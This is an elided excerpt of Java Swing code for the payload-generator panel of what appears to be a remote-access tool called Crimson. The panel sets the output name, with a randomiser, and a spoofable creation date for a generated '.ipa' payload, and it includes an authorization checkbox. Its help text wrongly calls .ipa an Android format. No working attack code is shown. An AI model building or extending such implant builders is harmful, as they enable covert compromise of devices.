 ...
 *******************************************************************************/
package subterranean.crimson.server.graphics.panels.generate.ipa;
...
import subterranean.crimson.server.generation.IPA;
import subterranean.crimson.server.graphics.GenerateIPA;
...
public class Main extends JPanel {
	...
	private GenerateIPA parent;

	public Main(GenerateIPA p) {
		parent = p;
		...
		if (Server.getSettings().isInformationPanels()) {
			...
			txtrTheJarPayload.setText("The IPA Generator will generate an Android .ipa file.");
		...
		JLabel lblJarCreationDate = new JLabel("Payload IPA Creation Date:");
		...
		JLabel lblInstalledJarCreation = new JLabel("Installed IPA Creation Date:");
			...
			public void mousePressed(MouseEvent e) {
				...
				if (!installed_date.equals("[CURRENT]")) {
					try {
						...
						// Wrong date format
						Logger.add("Failed to parse installed ipa date");
				...
				Thread p = new IPA(opts, Path.toUnix(textField_output_path.getText()), textField_output_name.getText(), Pdate.getTime());
				p.start();
				//
				parent.dispose();
			}
		...
		btnRandomizeName.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				textField_output_name.setText(subterranean.crimson.universal.Utilities.nameGen(5) + ".ipa");
		...
		chckbxIWillBe = new JCheckBox("I will use this IPA to install Crimson only on devices that I have authorization to do so.");
		...
		if (!Version.release) {
			textField_output_name.setText("payload.ipa");
		}
	...
	public void save(Options opts) {
		...
		Server.getSettings().setSavedIpaPayloadOptions(opts);
	}
